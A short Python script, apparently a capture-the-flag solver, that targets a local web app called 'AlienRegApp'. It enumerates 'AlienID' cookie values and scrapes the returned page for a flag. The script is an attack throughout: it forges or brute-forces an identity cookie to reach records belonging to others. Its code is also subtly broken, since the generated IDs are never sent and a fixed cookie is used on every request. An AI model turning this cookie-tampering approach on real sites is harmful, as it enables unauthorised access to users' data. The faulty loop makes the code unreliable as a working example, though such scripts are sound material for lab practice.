import requests
from bs4 import BeautifulSoup
import re
import itertools

def generate_strings():
    digits = '0123456789'
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for d1 in itertools.product(digits, repeat=3):
        for l in itertools.product(letters, repeat=5):
            for d2 in itertools.product(digits, repeat=3):
                yield ''.join(d1) + '-' + ''.join(l) + '-' + ''.join(d2) + '-P1'

def main():
	url = "http://localhost:5050/AlienRegApp/id"

	regex = r'[0-9]{3}-[A-Z]{5}-[0-9]{3}-P1'
	for id in generate_strings():
		cookies = {"AlienID": "870-WCWJB-334-P1"}
		r = requests.get(cookies=cookies, url=url)

		if r.status_code == 200:
			data = BeautifulSoup(r.content.decode("utf-8"), 'html.parser')
			planet = str(data.find('h1')).split(" ")[-1][:-5]
			if planet == "FLAG":
				flag = str(data.find_all('p')[1]).split(": ")[1][: -4]
				print(flag)

if __name__ == '__main__':
	main()